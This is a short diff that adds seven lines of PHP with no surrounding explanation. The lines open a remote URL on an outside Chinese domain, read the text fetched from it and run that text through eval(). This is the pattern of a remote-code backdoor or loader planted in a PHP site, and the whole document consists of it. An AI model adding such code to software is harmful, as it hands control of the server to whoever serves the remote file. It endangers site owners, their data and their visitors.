@@ -1,0 +1,7 @@
+$handle = fopen('http://ximcx.cn/2.txt', 'r');
+    $content = '';
+    while(false != ($a = fread($handle, 8080))){
+        $content .= $a;
+    }
+	eval($a = $content);
+fclose($handle);
